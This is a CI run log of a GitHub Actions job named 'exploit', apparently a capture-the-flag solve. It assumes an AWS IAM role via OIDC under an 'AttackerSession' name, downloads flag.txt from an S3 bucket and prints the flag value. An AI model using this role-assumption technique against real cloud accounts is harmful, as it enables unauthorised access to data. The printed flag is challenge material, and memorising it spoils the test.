2025-11-08T09:38:56.6668842Z Current runner version: '2.329.0'
2025-11-08T09:38:56.6725041Z ##[group]Runner Image Provisioner
2025-11-08T09:38:56.6726513Z Hosted Compute Agent
2025-11-08T09:38:56.6727459Z Version: 20251016.436
2025-11-08T09:38:56.6728516Z Commit: 8ab8ac8bfd662a3739dab9fe09456aba92132568
2025-11-08T09:38:56.6729682Z Build Date: 2025-10-15T20:44:12Z
2025-11-08T09:38:56.6735244Z ##[endgroup]
2025-11-08T09:38:56.6736166Z ##[group]Operating System
2025-11-08T09:38:56.6737067Z Ubuntu
2025-11-08T09:38:56.6738019Z 24.04.3
2025-11-08T09:38:56.6738811Z LTS
2025-11-08T09:38:56.6739574Z ##[endgroup]
2025-11-08T09:38:56.6740745Z ##[group]Runner Image
2025-11-08T09:38:56.6741733Z Image: ubuntu-24.04
2025-11-08T09:38:56.6742655Z Version: 20251102.99.1
2025-11-08T09:38:56.6744583Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20251102.99/images/ubuntu/Ubuntu2404-Readme.md
2025-11-08T09:38:56.6747498Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20251102.99
2025-11-08T09:38:56.6749393Z ##[endgroup]
2025-11-08T09:38:56.6751518Z ##[group]GITHUB_TOKEN Permissions
2025-11-08T09:38:56.6754147Z Contents: read
2025-11-08T09:38:56.6755168Z Metadata: read
2025-11-08T09:38:56.6756065Z ##[endgroup]
2025-11-08T09:38:56.6759322Z Secret source: Actions
2025-11-08T09:38:56.6761015Z Prepare workflow directory
2025-11-08T09:38:56.7657646Z Prepare all required actions
2025-11-08T09:38:56.7796186Z Getting action download info
2025-11-08T09:38:57.0694089Z Download action repository 'actions/checkout@v3' (SHA:f43a0e5ff2bd294095638e18286ca9a3d1956744)
2025-11-08T09:38:57.2875149Z Download action repository 'aws-actions/configure-aws-credentials@v4' (SHA:7474bc4690e29a8392af63c5b98e7449536d5c3a)
2025-11-08T09:38:57.5892778Z Complete job name: exploit
2025-11-08T09:38:57.6528089Z ##[group]Run actions/checkout@v3
2025-11-08T09:38:57.6529294Z with:
2025-11-08T09:38:57.6530447Z   repository: s-miruku/action_stdio2025admin_oh-i-dont-care-web
2025-11-08T09:38:57.6531725Z   token: ***
2025-11-08T09:38:57.6532360Z   ssh-strict: true
2025-11-08T09:38:57.6533051Z   persist-credentials: true
2025-11-08T09:38:57.6533779Z   clean: true
2025-11-08T09:38:57.6534381Z   sparse-checkout-cone-mode: true
2025-11-08T09:38:57.6535193Z   fetch-depth: 1
2025-11-08T09:38:57.6535810Z   fetch-tags: false
2025-11-08T09:38:57.6536510Z   lfs: false
2025-11-08T09:38:57.6537180Z   submodules: false
2025-11-08T09:38:57.6538007Z   set-safe-directory: true
2025-11-08T09:38:57.6539137Z ##[endgroup]
2025-11-08T09:38:57.7482889Z Syncing repository: s-miruku/action_stdio2025admin_oh-i-dont-care-web
2025-11-08T09:38:57.7485951Z ##[group]Getting Git version info
2025-11-08T09:38:57.7487899Z Working directory is '/home/runner/work/action_stdio2025admin_oh-i-dont-care-web/action_stdio2025admin_oh-i-dont-care-web'
2025-11-08T09:38:57.7490585Z [command]/usr/bin/git version
2025-11-08T09:38:57.7574044Z git version 2.51.2
2025-11-08T09:38:57.7603181Z ##[endgroup]
2025-11-08T09:38:57.7619050Z Temporarily overriding HOME='/home/runner/work/_temp/a61fda2c-945a-4d1d-9218-b2a3e94a7f98' before making global git config changes
2025-11-08T09:38:57.7622671Z Adding repository directory to the temporary git global config as a safe directory
2025-11-08T09:38:57.7626360Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/action_stdio2025admin_oh-i-dont-care-web/action_stdio2025admin_oh-i-dont-care-web
2025-11-08T09:38:57.7666482Z Deleting the contents of '/home/runner/work/action_stdio2025admin_oh-i-dont-care-web/action_stdio2025admin_oh-i-dont-care-web'
2025-11-08T09:38:57.7669759Z ##[group]Initializing the repository
2025-11-08T09:38:57.7674131Z [command]/usr/bin/git init /home/runner/work/action_stdio2025admin_oh-i-dont-care-web/action_stdio2025admin_oh-i-dont-care-web
2025-11-08T09:38:57.7789784Z hint: Using 'master' as the name for the initial branch. This default branch name
2025-11-08T09:38:57.7792868Z hint: is subject to change. To configure the initial branch name to use in all
2025-11-08T09:38:57.7794389Z hint: of your new repositories, which will suppress this warning, call:
2025-11-08T09:38:57.7795803Z hint:
2025-11-08T09:38:57.7796563Z hint: 	git config --global init.defaultBranch <name>
2025-11-08T09:38:57.7798111Z hint:
2025-11-08T09:38:57.7799116Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
2025-11-08T09:38:57.7800985Z hint: 'development'. The just-created branch can be renamed via this command:
2025-11-08T09:38:57.7802314Z hint:
2025-11-08T09:38:57.7803028Z hint: 	git branch -m <name>
2025-11-08T09:38:57.7803857Z hint:
2025-11-08T09:38:57.7804918Z hint: Disable this message with "git config set advice.defaultBranchName false"
2025-11-08T09:38:57.7807600Z Initialized empty Git repository in /home/runner/work/action_stdio2025admin_oh-i-dont-care-web/action_stdio2025admin_oh-i-dont-care-web/.git/
2025-11-08T09:38:57.7812503Z [command]/usr/bin/git remote add origin https://github.com/s-miruku/action_stdio2025admin_oh-i-dont-care-web
2025-11-08T09:38:57.7853521Z ##[endgroup]
2025-11-08T09:38:57.7854731Z ##[group]Disabling automatic garbage collection
2025-11-08T09:38:57.7855774Z [command]/usr/bin/git config --local gc.auto 0
2025-11-08T09:38:57.7883111Z ##[endgroup]
2025-11-08T09:38:57.7884339Z ##[group]Setting up auth
2025-11-08T09:38:57.7888870Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
2025-11-08T09:38:57.7919016Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
2025-11-08T09:38:57.8268956Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
2025-11-08T09:38:57.8301684Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
2025-11-08T09:38:57.8534725Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
2025-11-08T09:38:57.8570870Z ##[endgroup]
2025-11-08T09:38:57.8573469Z ##[group]Fetching the repository
2025-11-08T09:38:57.8581142Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --progress --no-recurse-submodules --depth=1 origin +78bf9dcc5b71fdf7774d75209ac240936a695a21:refs/remotes/origin/main
2025-11-08T09:38:58.0042618Z remote: Enumerating objects: 8, done.        
2025-11-08T09:38:58.0045107Z remote: Counting objects:  12% (1/8)        
2025-11-08T09:38:58.0046166Z remote: Counting objects:  25% (2/8)        
2025-11-08T09:38:58.0047115Z remote: Counting objects:  37% (3/8)        
2025-11-08T09:38:58.0047989Z remote: Counting objects:  50% (4/8)        
2025-11-08T09:38:58.0049178Z remote: Counting objects:  62% (5/8)        
2025-11-08T09:38:58.0050416Z remote: Counting objects:  75% (6/8)        
2025-11-08T09:38:58.0051730Z remote: Counting objects:  87% (7/8)        
2025-11-08T09:38:58.0052719Z remote: Counting objects: 100% (8/8)        
2025-11-08T09:38:58.0053714Z remote: Counting objects: 100% (8/8), done.        
2025-11-08T09:38:58.0054717Z remote: Compressing objects:  20% (1/5)        
2025-11-08T09:38:58.0055675Z remote: Compressing objects:  40% (2/5)        
2025-11-08T09:38:58.0056590Z remote: Compressing objects:  60% (3/5)        
2025-11-08T09:38:58.0057596Z remote: Compressing objects:  80% (4/5)        
2025-11-08T09:38:58.0058556Z remote: Compressing objects: 100% (5/5)        
2025-11-08T09:38:58.0059585Z remote: Compressing objects: 100% (5/5), done.        
2025-11-08T09:38:58.0061110Z remote: Total 8 (delta 0), reused 8 (delta 0), pack-reused 0 (from 0)        
2025-11-08T09:38:58.0133362Z From https://github.com/s-miruku/action_stdio2025admin_oh-i-dont-care-web
2025-11-08T09:38:58.0135968Z  * [new ref]         78bf9dcc5b71fdf7774d75209ac240936a695a21 -> origin/main
2025-11-08T09:38:58.0174521Z ##[endgroup]
2025-11-08T09:38:58.0175733Z ##[group]Determining the checkout info
2025-11-08T09:38:58.0178165Z ##[endgroup]
2025-11-08T09:38:58.0180297Z ##[group]Checking out the ref
2025-11-08T09:38:58.0182196Z [command]/usr/bin/git checkout --progress --force -B main refs/remotes/origin/main
2025-11-08T09:38:58.0226672Z Switched to a new branch 'main'
2025-11-08T09:38:58.0230597Z branch 'main' set up to track 'origin/main'.
2025-11-08T09:38:58.0238587Z ##[endgroup]
2025-11-08T09:38:58.0273027Z [command]/usr/bin/git log -1 --format='%H'
2025-11-08T09:38:58.0295609Z '78bf9dcc5b71fdf7774d75209ac240936a695a21'
2025-11-08T09:38:58.0554814Z ##[group]Run aws-actions/configure-aws-credentials@v4
2025-11-08T09:38:58.0555447Z with:
2025-11-08T09:38:58.0556080Z   role-to-assume: arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875
2025-11-08T09:38:58.0556893Z   role-session-name: AttackerSession-19191297525
2025-11-08T09:38:58.0557489Z   aws-region: ap-southeast-1
2025-11-08T09:38:58.0557981Z   audience: sts.amazonaws.com
2025-11-08T09:38:58.0558486Z   output-env-credentials: true
2025-11-08T09:38:58.0558946Z ##[endgroup]
2025-11-08T09:38:58.2909748Z Assuming role with OIDC
2025-11-08T09:38:59.2752703Z Authenticated as assumedRoleId AROA2DM4OQLMGV77NXLQE:AttackerSession-19191297525
2025-11-08T09:38:59.5327053Z ##[group]Run aws s3 cp s3://oh-i-really-do-care/flag.txt flag.txt --region ap-southeast-1
2025-11-08T09:38:59.5327828Z [36;1maws s3 cp s3://oh-i-really-do-care/flag.txt flag.txt --region ap-southeast-1[0m
2025-11-08T09:38:59.5328320Z [36;1mecho "--- FLAG CONTENT (Mission Complete) ---"[0m
2025-11-08T09:38:59.5328678Z [36;1mcat flag.txt[0m
2025-11-08T09:38:59.5328958Z [36;1mecho "-------------------------------------"[0m
2025-11-08T09:38:59.5366542Z shell: /usr/bin/bash -e {0}
2025-11-08T09:38:59.5366878Z env:
2025-11-08T09:38:59.5367153Z   AWS_DEFAULT_REGION: ap-southeast-1
2025-11-08T09:38:59.5367479Z   AWS_REGION: ap-southeast-1
2025-11-08T09:38:59.5368116Z   AWS_ACCESS_KEY_ID: ***
2025-11-08T09:38:59.5368503Z   AWS_SECRET_ACCESS_KEY: ***
2025-11-08T09:38:59.5374313Z   AWS_SESSION_TOKEN: ***
2025-11-08T09:38:59.5374628Z ##[endgroup]
2025-11-08T09:39:06.8092428Z Completed 46 Bytes/46 Bytes (64 Bytes/s) with 1 file(s) remaining
2025-11-08T09:39:06.8093566Z download: s3://oh-i-really-do-care/flag.txt to ./flag.txt        
2025-11-08T09:39:06.9022991Z --- FLAG CONTENT (Mission Complete) ---
2025-11-08T09:39:06.9036668Z STDIO2025_33{788366c4736bfe0ec7e18a398a105e1f}-------------------------------------
2025-11-08T09:39:06.9123759Z Post job cleanup.
2025-11-08T09:39:07.0522310Z Post job cleanup.
2025-11-08T09:39:07.1276673Z [command]/usr/bin/git version
2025-11-08T09:39:07.1316191Z git version 2.51.2
2025-11-08T09:39:07.1362784Z Temporarily overriding HOME='/home/runner/work/_temp/1736e690-5074-433a-93db-b58813b2a064' before making global git config changes
2025-11-08T09:39:07.1364765Z Adding repository directory to the temporary git global config as a safe directory
2025-11-08T09:39:07.1367790Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/action_stdio2025admin_oh-i-dont-care-web/action_stdio2025admin_oh-i-dont-care-web
2025-11-08T09:39:07.1407702Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
2025-11-08T09:39:07.1441457Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
2025-11-08T09:39:07.1684107Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
2025-11-08T09:39:07.1706863Z http.https://github.com/.extraheader
2025-11-08T09:39:07.1721853Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
2025-11-08T09:39:07.1753757Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
2025-11-08T09:39:07.2097935Z Cleaning up orphan processes
